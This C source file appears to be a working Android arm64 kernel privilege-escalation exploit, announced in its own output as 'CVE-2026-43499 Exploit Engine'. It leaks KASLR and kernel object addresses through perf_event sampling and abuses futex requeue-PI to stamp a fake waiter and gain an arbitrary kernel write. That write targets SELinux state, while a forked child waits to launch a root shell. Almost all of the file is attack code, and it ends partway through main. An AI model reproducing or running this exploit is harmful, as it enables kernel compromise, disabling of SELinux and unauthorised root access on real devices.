#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/futex.h>
#include <linux/capability.h>
#include <linux/perf_event.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <ucontext.h>
#include <unistd.h>
#include <time.h>

// ================= Logging System =================
#define COLOR_GREEN "\033[32m"
#define COLOR_RED   "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

// Fatal error handler: Sleep infinitely to prevent kernel panic caused by
// exiting while dangling pointers (PI waiter) still exist in the kernel.
#define pr_error(fmt, ...) do { \
        printf(COLOR_RED "[!] " COLOR_DEFAULT fmt, ##__VA_ARGS__); fflush(stdout); \
        for(;;) sleep(3600); \
    } while (0)
#define pr_warning(fmt, ...) do { \
        printf(COLOR_RED "[-] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
    } while (0)
#define pr_info(fmt, ...) do { \
        printf(COLOR_YELLOW "[*] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
    } while (0)
#define pr_success(fmt, ...) do { \
        printf(COLOR_GREEN "[+] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
    } while (0)
// ====================================================================

static struct timespec t_start;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t_start); }
static double timer_ms(void) {
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    return (now.tv_sec - t_start.tv_sec) * 1000.0 + (now.tv_nsec - t_start.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

#define LINK_TEXT UINT64_C(0xffffffc010080000)
#define OFF_INIT_TASK UINT64_C(0x2ca2800)
#define OFF_INIT_CRED UINT64_C(0x2caf850)
#define OFF_SELINUX_STATE UINT64_C(0x2f07000)
#define OFF_LOG_BUF UINT64_C(0x2f1e0b4)
#define OFF_TASK_STATE UINT64_C(0x593324)
#define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x358d64)
#define OFF_SEL_READ_ENFORCE UINT64_C(0x70ccec)
#define OFF_TASK_SECCOMP UINT64_C(0x8d0)      /* offsetof(task_struct, seccomp) */
#define ARM64_REG_COUNT 33
#define ARM64_REG_MASK ((UINT64_C(1) << ARM64_REG_COUNT) - 1)

#define FUTEX_PRIVATE 128
#define LOCK_PI_PRIVATE (FUTEX_LOCK_PI | FUTEX_PRIVATE)
#define UNLOCK_PI_PRIVATE (FUTEX_UNLOCK_PI | FUTEX_PRIVATE)
#define WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE)
#define CMP_REQUEUE_PI_PRIVATE (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE)

static uint64_t runtime_text;
static uint64_t k_init_task;
static uint64_t k_selinux_state;
static uint64_t k_write_value;
static uint64_t k_fake_lock;
static uint64_t k_fake_lock2;
static uint64_t k_ghost_task;
static uint64_t k_current_task;
static uint64_t k_current_cred;
static uint64_t k_y_task;
static uint64_t k_waiter;
static int __orig_stdout = -1;
static int stage_fd = -1;
static pid_t process_pid;
static atomic_uintptr_t stamp_parent, stamp_value, stamp_lock;
static atomic_int stamp_done, stamp_status;

static int pi1, pi2, cond;
static atomic_int y_locked_l2, x_locked_l1, y_parking, x_blocking;
static atomic_int y_done, y_cleanup, x_done, y_tid;
static atomic_int y_task_ready;
static atomic_int respray_ready, respray_done;
static atomic_uintptr_t respray_parent, respray_value, respray_lock;
static unsigned fake_lock_index;
static int y_leak_only;

static long raw_futex(volatile int *u1, long op, long val, long val2,
                      volatile int *u2, long val3) {
  register long x0 __asm__("x0") = (long)u1;
  register long x1 __asm__("x1") = op;
  register long x2 __asm__("x2") = val;
  register long x3 __asm__("x3") = val2;
  register long x4 __asm__("x4") = (long)u2;
  register long x5 __asm__("x5") = val3;
  register long x8 __asm__("x8") = 98;
  __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3),
                   "r"(x4), "r"(x5), "r"(x8) : "memory", "cc");
  return x0;
}

static long raw_sched_setscheduler(int tid, int policy,
                                   struct sched_param *param) {
  register long x0 __asm__("x0") = tid;
  register long x1 __asm__("x1") = policy;
  register long x2 __asm__("x2") = (long)param;
  register long x8 __asm__("x8") = 119;
  __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x8)
                   : "memory", "cc");
  return x0;
}

static uint64_t ring_u64(const uint8_t *ring, uint64_t size, uint64_t pos) {
  uint64_t v, off = pos & (size - 1);
  if (off + 8 <= size) memcpy(&v, ring + off, 8);
  else {
    uint8_t b[8]; uint64_t first = size - off;
    memcpy(b, ring + off, first); memcpy(b + first, ring, 8 - first);
    memcpy(&v, b, 8);
  }
  return v;
}

static uint64_t leak_text(void) {
  pr_info("perf_event_open CPU_CLOCK sampling 30000...\n");
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 100000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN;
  a.sample_max_stack = 32;
  a.disabled = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 33;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 30000; i++) syscall(__NR_gettid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint64_t head = m->data_head, tail = m->data_tail, min = UINT64_MAX;
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t rs = m->data_size;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (rs - 1);
    if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = rs - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h);
      uint64_t ip = ring_u64(ring, rs, pos); pos += 16;
      uint64_t nr = ring_u64(ring, rs, pos); pos += 8;
      if (ip >= UINT64_C(0xffff000000000000) && ip < min) min = ip;
      for (uint64_t i = 0; i < nr && pos + 8 <= tail + h.size; i++) {
        uint64_t x = ring_u64(ring, rs, pos); pos += 8;
        if (x >= UINT64_C(0xffff000000000000) && x < min) min = x;
      }
    }
    tail += h.size;
  }
  munmap(m, map_size); close(fd);
  uint64_t res = min == UINT64_MAX ? 0 : (min & ~UINT64_C(0x1fffff)) + 0x80000;
  if (res) pr_info("Text base derived: 0x%016llx\n", (unsigned long long)res);
  return res;
}

static uint64_t leak_task_from_status(const char *status_path, uint64_t *cred_out) {
  pr_info("Leaking task_struct/cred via %s\n", status_path);
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 10000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  int status_fd = open(status_path, O_RDONLY | O_CLOEXEC);
  if (status_fd < 0) { close(fd); return 0; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char status[4096];
  for (int i = 0; i < 5000; i++) {
    syscall(__NR_lseek, status_fd, 0, SEEK_SET);
    syscall(__NR_read, status_fd, status, sizeof(status));
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = size - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      uint64_t state = runtime_text + OFF_TASK_STATE;
      if (abi && ip >= state && ip < state + 0x720 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        unsigned task_reg = ip <= state + 0x24 ? 3 : 26;
        uint64_t task = ring_u64(ring, size, pos + task_reg * 8);
        if (task >= UINT64_C(0xffffff8000000000) &&
            task < UINT64_C(0xffffffc000000000) && !(task & 7)) {
          unsigned slot;
          for (slot = 0; slot < 16 && candidates[slot] &&
               candidates[slot] != task; slot++);
          if (slot < 16) { candidates[slot] = task; counts[slot]++; }
        }
      }
      if (abi && ip >= state + 0x94 && ip < state + 0x350 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t cred = ring_u64(ring, size, pos + 20 * 8);
        if (cred >= UINT64_C(0xffffff8000000000) &&
            cred < UINT64_C(0xffffffc000000000) && !(cred & 7))
          *cred_out = cred;
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(status_fd); close(fd);
  if (best_count && *cred_out) {
      pr_success("Task %016llx | Cred %016llx (votes: %u)\n", (unsigned long long)best, (unsigned long long)*cred_out, best_count);
  }
  return best_count && *cred_out ? best : 0;
}

static uint64_t leak_syscall_sp(void) {
  pr_info("Leaking syscall stack pointer via futex...\n");
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 1000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(fd); return 0; }
  volatile int a1 = 1, a2 = 0;
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 5000; i++)
    (void)raw_futex(&a1, WAIT_REQUEUE_PI_PRIVATE, 0, 0, &a2, 0);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  uint64_t fun = runtime_text + OFF_FUTEX_WAIT_REQUEUE_PI;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t b[sizeof(h)]; size_t first = size - off;
      memcpy(b, ring + off, first); memcpy(b + first, ring, sizeof(h)-first);
      memcpy(&h, b, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      if (abi && ip >= fun + 0x80 && ip < fun + 0x380 &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t sp = ring_u64(ring, size, pos + 31 * 8);
        uint64_t syscall_sp = sp + 0x230;
        unsigned slot;
        for (slot = 0; slot < 16 && candidates[slot] &&
             candidates[slot] != syscall_sp; slot++);
        if (slot < 16) { candidates[slot] = syscall_sp; counts[slot]++; }
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(fd);
  if (best) pr_info("Waiter stack pointer: 0x%016llx\n", (unsigned long long)best);
  return best_count ? best : 0;
}

static uint64_t leak_selinux_state(void) {
  pr_info("Leaking selinux_state via /sys/fs/selinux/enforce...\n");
  struct perf_event_attr a;
  memset(&a, 0, sizeof(a));
  a.type = PERF_TYPE_SOFTWARE;
  a.size = sizeof(a);
  a.config = PERF_COUNT_SW_CPU_CLOCK;
  a.sample_period = 1000;
  a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN |
                  PERF_SAMPLE_REGS_INTR;
  a.sample_regs_intr = ARM64_REG_MASK;
  a.sample_max_stack = 16;
  a.disabled = 1;
  a.exclude_user = 1;
  a.exclude_hv = 1;
  int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
  if (fd < 0) return 0;
  int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (enforce_fd < 0) { close(fd); return 0; }
  long ps = sysconf(_SC_PAGESIZE);
  size_t map_size = (size_t)ps * 129;
  struct perf_event_mmap_page *m = mmap(NULL, map_size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { close(enforce_fd); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char b[8];
  for (int i = 0; i < 5000; i++) {
    (void)syscall(__NR_lseek, enforce_fd, 0, SEEK_SET);
    (void)syscall(__NR_read, enforce_fd, b, sizeof(b));
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint8_t *ring = (uint8_t *)m + m->data_offset;
  uint64_t size = m->data_size, tail = m->data_tail, head = m->data_head;
  uint64_t candidates[16] = {0};
  unsigned counts[16] = {0};
  uint64_t fun = runtime_text + OFF_SEL_READ_ENFORCE;
  while (tail + sizeof(struct perf_event_header) <= head) {
    struct perf_event_header h;
    uint64_t off = tail & (size - 1);
    if (off + sizeof(h) <= size) memcpy(&h, ring + off, sizeof(h));
    else {
      uint8_t tmp[sizeof(h)]; size_t first = size - off;
      memcpy(tmp, ring + off, first);
      memcpy(tmp + first, ring, sizeof(h) - first);
      memcpy(&h, tmp, sizeof(h));
    }
    if (h.size < sizeof(h) || tail + h.size > head) break;
    if (h.type == PERF_RECORD_SAMPLE) {
      uint64_t pos = tail + sizeof(h), ip = ring_u64(ring, size, pos);
      pos += 16;
      uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
      uint64_t abi = ring_u64(ring, size, pos); pos += 8;
      if (abi && ip >= fun + 0x54 && ip <= fun + 0x5c &&
          pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
        uint64_t state = ring_u64(ring, size, pos + 8 * 8);
        if (state >= UINT64_C(0xffffffc000000000) && !(state & 0xfff)) {
          unsigned slot;
          for (slot = 0; slot < 16 && candidates[slot] &&
               candidates[slot] != state; slot++);
          if (slot < 16) { candidates[slot] = state; counts[slot]++; }
        }
      }
    }
    tail += h.size;
  }
  uint64_t best = 0; unsigned best_count = 0;
  for (unsigned i = 0; i < 16; i++)
    if (counts[i] > best_count) { best = candidates[i]; best_count = counts[i]; }
  munmap(m, map_size); close(enforce_fd); close(fd);
  if (best) pr_info("Selinux state: 0x%016llx\n", (unsigned long long)best);
  return best_count ? best : 0;
}

static void cpu_yield(void) {
  __asm__ volatile("yield" ::: "memory");
}

static void record_stage(char stage) {
  if (stage_fd < 0) return;
  ssize_t written = pwrite(stage_fd, &stage, 1, 0);
  if (written != 1) return;
  (void)fsync(stage_fd);
}

struct k_fpsimd_context {
  uint32_t magic, size, fpsr, fpcr;
  uint8_t vregs[32 * 16];
};

static struct k_fpsimd_context *find_fpsimd(unsigned char *p,
                                            unsigned char *end) {
  while ((size_t)(end - p) >= 8) {
    uint32_t magic, size;
    memcpy(&magic, p, 4); memcpy(&size, p + 4, 4);
    if (!magic && !size) return NULL;
    if (size < 8 || (size & 15) || (size_t)(end - p) < size) return NULL;
    if (magic == UINT32_C(0x46508001) && size >= 0x210)
      return (struct k_fpsimd_context *)(void *)p;
    p += size;
  }
  return NULL;
}

static void sigusr2(int sig, siginfo_t *info, void *opaque) {
  (void)sig; (void)info;
  ucontext_t *uc = opaque;
  unsigned char *start = uc->uc_mcontext.__reserved;
  struct k_fpsimd_context *fp = find_fpsimd(start, start +
                                             sizeof(uc->uc_mcontext.__reserved));
  if (!fp || (size_t)0x108 + 0x50 > sizeof(fp->vregs)) {
    atomic_store(&stamp_status, -1); atomic_store(&stamp_done, 1); return;
  }
  uint64_t *w = (uint64_t *)(void *)(fp->vregs + 0x108);
  memset(w, 0, 0x50);
  w[0] = atomic_load(&stamp_parent); 
  w[1] = atomic_load(&stamp_value);  
  w[2] = 0;                         
  w[6] = k_ghost_task;              
  w[7] = atomic_load(&stamp_lock);   
  atomic_store(&stamp_status, 1);
  atomic_store(&stamp_done, 1);
}

static int stamp_waiter(uint64_t parent, uint64_t value, uint64_t lock) {
  atomic_store(&stamp_parent, parent);
  atomic_store(&stamp_value, value);
  atomic_store(&stamp_lock, lock);
  atomic_store(&stamp_status, 0);
  atomic_store(&stamp_done, 0);
  (void)syscall(SYS_tgkill, process_pid, atomic_load(&y_tid), SIGUSR2);
  return atomic_load_explicit(&stamp_done, memory_order_acquire) &&
         atomic_load(&stamp_status) == 1;
}

static void sigusr1(int sig) { (void)sig; }

static void *thread_y(void *unused) {
  (void)unused;
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigusr2;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR2, &sa, NULL) != 0) return NULL;
  int tid = (int)syscall(__NR_gettid);
  atomic_store(&y_tid, tid);
  pr_info("Thread Y spawned with TID %d\n", tid);
  
  char status_path[64];
  uint64_t y_cred = 0;
  snprintf(status_path, sizeof(status_path), "/proc/self/task/%d/status", tid);
  k_y_task = leak_task_from_status(status_path, &y_cred);
  uint64_t syscall_sp = leak_syscall_sp();
  k_waiter = syscall_sp ? syscall_sp - 0x1D8 : 0;
  (void)y_cred; (void)k_y_task; (void)k_waiter;
  atomic_store_explicit(&y_task_ready, 1, memory_order_release);
  if (y_leak_only) return NULL;
  
  if (raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
  atomic_store(&y_locked_l2, 1);
  while (!atomic_load(&x_locked_l1)) sched_yield();
  atomic_store(&y_parking, 1);
  
  pr_info("Thread Y: waiting requeue on cond futex...\n");
  (void)raw_futex(&cond, WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);

  pr_info("Thread Y: stamping waiter into kernel stack...\n");
  int stamped = stamp_waiter(0, 0, k_fake_lock);
  atomic_store_explicit(&y_done, stamped ? 1 : -1, memory_order_release);
  for (;;) {
    if (atomic_exchange(&respray_ready, 0)) {
      stamped = stamp_waiter(atomic_load(&respray_parent),
                             atomic_load(&respray_value),
                             atomic_load(&respray_lock));
      atomic_store_explicit(&respray_done, stamped ? 1 : -1,
                            memory_order_release);
    }
    if (atomic_load_explicit(&y_cleanup, memory_order_acquire)) break;
    cpu_yield();
  }
  int dummy = (int)(0x80000000U | (unsigned)getpid());
  struct timespec zero = {0, 0};
  (void)raw_futex(&dummy, LOCK_PI_PRIVATE, 0, (long)&zero, NULL, 0);
  (void)raw_futex(&pi2, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  while (!atomic_load(&x_done)) sched_yield();
  return NULL;
}

static void *thread_x(void *unused) {
  (void)unused;
  pr_info("Thread X spawned\n");
  while (!atomic_load(&y_locked_l2)) sched_yield();
  if (raw_futex(&pi1, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
  atomic_store(&x_locked_l1, 1);
  atomic_store(&x_blocking, 1);
  pr_info("Thread X: blocking on pi2 to form deadlock...\n");
  (void)raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0);
  (void)raw_futex(&pi1, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  (void)raw_futex(&pi2, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  atomic_store(&x_done, 1);
  return NULL;
}

static long trigger_pi(void) {
  static int policy;
  struct sched_param p = {.sched_priority = 0};
  policy = policy == SCHED_OTHER ? SCHED_BATCH : SCHED_OTHER;
  return raw_sched_setscheduler(atomic_load(&y_tid), policy, &p);
}

static int __attribute__((unused)) read_enforce(void) {
  char b[4] = {0}; int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (fd < 0) return -1;
  ssize_t n = read(fd, b, sizeof(b)); close(fd);
  return n > 0 ? b[0] - '0' : -1;
}

static int write_value(uint64_t target, uint64_t value) {
  static const unsigned windows[] = {
  0xa80, 0xb00, 0xb80, 0xc00, 0xc80,
  0xd00, 0xd80, 0xe00, 0xe80,
  0xf00,
};
  if (fake_lock_index >= sizeof(windows) / sizeof(windows[0])) {
      pr_error("Out of fake lock windows! (Index %u)\n", fake_lock_index);
  }
  k_fake_lock2 = k_selinux_state + windows[fake_lock_index++];
  atomic_store(&respray_parent, (target - 8) & ~UINT64_C(3));
  atomic_store(&respray_value, value);
  atomic_store(&respray_lock, k_fake_lock2);
  atomic_store(&respray_done, 0);
  
  // Trigger the underlying PI hijack write
  atomic_store_explicit(&respray_ready, 1, memory_order_release);
  while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
  if (atomic_load(&respray_done) < 0) {
      pr_error("PI arb-write failed to stamp waiter.\n");
  }
  return trigger_pi() == 0;
}

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  // Ignore SIGHUP to survive terminal closure
  signal(SIGHUP, SIG_IGN);
  __orig_stdout = dup(STDOUT_FILENO);
  stage_fd = open("/data/local/tmp/ghostlock54.stage", O_WRONLY | O_CREAT | O_CLOEXEC, 0600);
  record_stage('0');
  process_pid = getpid();
  
  timer_reset();
  pr_info("CVE-2026-43499 Exploit Engine Initiated\n");
  pr_info("Target PID: %d | UID: %d | GID: %d\n", getpid(), getuid(), getgid());

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr1;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR1, &sa, NULL) != 0) return 1;

  runtime_text = leak_text();
  if (!runtime_text) { pr_error("KASLR leak failed\n"); }
  
  k_selinux_state = leak_selinux_state();
  if (!k_selinux_state) { pr_error("SELinux state leak failed\n"); }
  
  k_current_task = leak_task_from_status("/proc/self/status", &k_current_cred);
  if (!k_current_task) { pr_error("current task leak failed\n"); }
  
  record_stage('1');
  uint64_t slide = runtime_text - LINK_TEXT;
  uint64_t data_delta = k_selinux_state - (runtime_text + OFF_SELINUX_STATE);
  k_init_task = runtime_text + OFF_INIT_TASK + data_delta;
  uint64_t log_start = runtime_text + OFF_LOG_BUF + data_delta;
  k_write_value = (log_start + 0xffff) & ~UINT64_C(0xffff);
  k_ghost_task = k_selinux_state + 0x20;
  k_fake_lock = k_selinux_state + 0xa00;
  
  TIMER("Memory layout resolved");
  pr_info("text_base=0x%016llx slide=0x%016llx\n", (unsigned long long)runtime_text, (unsigned long long)slide);
  pr_info("init_task=0x%016llx selinux_st=0x%016llx\n", (unsigned long long)k_init_task, (unsigned long long)k_selinux_state);
  pr_info("write_val=0x%016llx\n", (unsigned long long)k_write_value);

  if (argc == 2 && strcmp(argv[1], "--leak-only") == 0) {
    pr_success("Leak-only verification passed.\n");
    return 0;
  }

  pthread_t tx, ty;
  y_leak_only = argc == 2 && strcmp(argv[1], "--leak-y-only") == 0;
  
  if (pthread_create(&ty, NULL, thread_y, NULL) != 0) return 2;
  while (!atomic_load_explicit(&y_task_ready, memory_order_acquire)) sched_yield();
  if (atomic_load(&y_task_ready) < 0) { pr_error("Y task leak failed\n"); }
  
  if (y_leak_only) {
    pthread_join(ty, NULL);
    pr_success("Y task leak-only verification passed.\n");
    return 0;
  }
  
  while (!atomic_load(&y_locked_l2)) sched_yield();
  if (pthread_create(&tx, NULL, thread_x, NULL) != 0) return 2;
  while (!(atomic_load(&x_locked_l1) && atomic_load(&y_parking) && atomic_load(&x_blocking))) sched_yield();
  
  usleep(30000);
  record_stage('2');
  
  long r = raw_futex(&cond, CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
  record_stage('3');
  cond = 1;
  __atomic_thread_fence(__ATOMIC_SEQ_CST);
  syscall(SYS_tgkill, getpid(), atomic_load(&y_tid), SIGUSR1);
  
  if (r != -EDEADLK) {
    pr_error("CMP_REQUEUE_PI result: %ld (Expected: %d)\n", r, -EDEADLK);
  }
  while (!atomic_load_explicit(&y_done, memory_order_acquire)) sched_yield();
  if (atomic_load(&y_done) < 0) {
    record_stage('E');
    pr_error("sigreturn stamp failed\n");
  }
  record_stage('4');
  TIMER("Deadlock detected, waiter armed");
  
  if (trigger_pi() != 0) { pr_error("settle trigger failed\n"); }
  usleep(15000);
  record_stage('5');
  TIMER("Waiter settled into zero-BSS");

  uint64_t k_init_cred = runtime_text + OFF_INIT_CRED + data_delta;
  pr_info("k_init_cred = 0x%016llx\n", (unsigned long long)k_init_cred);

  volatile int *done_flag = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
  if (done_flag == MAP_FAILED) { pr_error("mmap failed\n"); }
  *done_flag = 0;

  int task_pipe[2];
  if (pipe(task_pipe) < 0) { pr_error("pipe failed\n"); }

  pr_info("Forking isolated root shell process...\n");
  pid_t child_pid = fork();
  if (child_pid < 0) { pr_error("fork failed\n"); }

  if (child_pid == 0) {
    close(task_pipe[0]);
    uint64_t my_cred = 0;
    uint64_t my_task = leak_task_from_status("/proc/self/status", &my_cred);
    uint64_t pair[2] = { my_task, my_cred };
    (void)write(task_pipe[1], pair, sizeof(pair));
    close(task_pipe[1]);
    
    while (__atomic_load_n(done_flag, __ATOMIC_ACQUIRE) == 0) {
      __asm__ volatile("yield" ::: "memory");
    }
    
    pr_success("[CHILD] uid=%d euid=%d\n", getuid(), geteuid());
    pr_success("[CHILD] Running root action. Launching shell...\n");
    
    {
      struct __user_cap_header_struct ch = { .version = _LINUX_CAPABILITY_VERSION_3, .pid = 0 };
      struct __user_cap_data_struct cd[2] = {{0}};
      if (syscall(SYS_capget, &ch, cd) == 0) {
        pr_info("[CHILD] Eff=%08x%08x Prm=%08x%08x Bnd=%08x%08x\n", cd[1].effective, cd[0].effective, cd[1].permitted, cd[0].permitted, cd[1].inheritable, cd[0].inheritable);
      }
    }
    
    dup2(__orig_stdout, STDOUT_FILENO);
    dup2(__orig_stdout, STDERR_FILENO);
    signal(SIGHUP, SIG_IGN);
    execl("/system/bin/sh", "sh", (char *)NULL);
    _exit(1);
  }

  close(task_pipe[1]);
  uint64_t pair[2] = {0, 0};
  ssize_t got = read(task_pipe[0], pair, sizeof(pair));
  close(task_pipe[0]);
  if (got != (ssize_t)sizeof(pair) || !pair[0] || !pair[1]) {
    pr_error("child task/cred leak failed\n");
  }
  uint64_t child_task = pair[0];
  uint64_t child_cred = pair[1];
  
  pr_info("Child PID: %d | Task: 0x%016llx | Cred: 0x%016llx\n", (int)child_pid, (unsigned long long)child_task, (unsigned long long)child_cred);
  record_stage('7');

  int before = read_enforce();
  int wr = write_value(k_selinux_state, k_write_value);
  usleep(50000);
  int after = read_enforce();
  pr_success("SELinux write_trigger=%d enforce=%d->%d\n", wr, before, after);
  record_stage('6');

